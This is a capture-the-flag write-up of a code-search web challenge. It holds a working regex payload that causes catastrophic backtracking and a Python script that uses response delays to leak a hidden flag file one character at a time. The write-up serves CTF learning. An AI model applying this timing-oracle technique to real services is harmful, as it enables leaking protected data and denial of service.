This challenge allows us to search for words or expressions from a list of files containing programs written in different programming langauages.

![image](https://github.com/user-attachments/assets/bc95cbf1-776b-4cb2-8bc8-5b9d74457971)


On viewing the code_samples folder within the source code, we can see that there is a file `flag.txt`.


On viewing the source code, we can see that the visibility of flag.txt file is set to false.
```JS
function initializeFiles() {
  const files = fs.readdirSync(CODE_SAMPLES_DIR);
  files.forEach(file => {
    filesIndex[file] = {
      visible: file !== 'flag.txt',
      path: path.join(CODE_SAMPLES_DIR, file),
      name: file,
      language: LANG_MAP[path.extname(file)] || null
    };
  });
  console.log(chalk.green('Initialized file index.'));
}
```
But the file is still added to the list of files which are traversed. 
Which means that we won't be able to find the contents within this file but the system still goes through `flag.txt` everytime a search is made for the contents within it.

Further, we also can observe that, only a file which is set to be visible can be accessed.
```JS
app.get('/view/:fileName', (req, res) => {
  const fileName = req.params.fileName;
  const fileData = filesIndex[fileName];

  if (!fileData?.visible) {
    return res.status(404).send('File not found or inaccessible.');
  }
```

The idea for the solution is to use regex to identify the flag. Suppose our guess for the characters within the flag is correct, then there should be an extra delay in the response to indicate that the flag is correct.

https://regex101.com/ was used to assist in making of the regex.
The regex was made such that, in case the guess is correct, then there is no delay and otherwise there is a delay.

payload - 
` ^guess|^(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$ `
![image](https://github.com/user-attachments/assets/3ee6bddb-23c8-4057-bc89-d74c33bc3af8)

![image](https://github.com/user-attachments/assets/a36c929a-115a-45c1-bc06-2c520dba1668)
As observed, it shows *catastrophic backtracking* when the guess is incorrect and it loads quickly otherwise.

Hence, a python script is written based on this, such that we guess the next character using the delays. The python script assists to change the characters and check the delay.

However, while testing the query, we can observe - 
```
>>> r = requests.post(url, json={"query":"/^a|^(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$/","language":"All"})
>>> r.elapsed
datetime.timedelta(seconds=1, microseconds=11727)
>>> r = requests.post(url, json={"query":"/^u|^(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$/","language":"All"})
>>> r.elapsed
datetime.timedelta(seconds=1, microseconds=12811)

```
that the time required is almost the same whether the guess is correct or wrong.
This is because there are many files other than flag.txt which can match regex for the second part while not matching for the first so there will be the same delay regardless of our guess being right.

Hence we need to modify our payload to - 
` ^uoftctf{guess}|^uoft(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$ `
since ``uoft`` would not get any match out of the flag.txt file so the catastrophic backtracking won't happen unless the search is done within the flag.txt file.

Hence the final script made to solve the challenge -
```python
import requests

url = "http://localhost:32768/search"
flag = ""

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}"
while True:
  for ch in charset:
    r = requests.post(url, json={"query":"/^uoftctf\{" + flag + ch + "|^uoft(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)(.*?)~$/","language":"All"})
    if(r.elapsed.total_seconds() < 0.8):
      flag += ch
      print(flag)
      break
    if(ch == '}'):
      exit()
```
[this challenge was solved after the ctf ended]





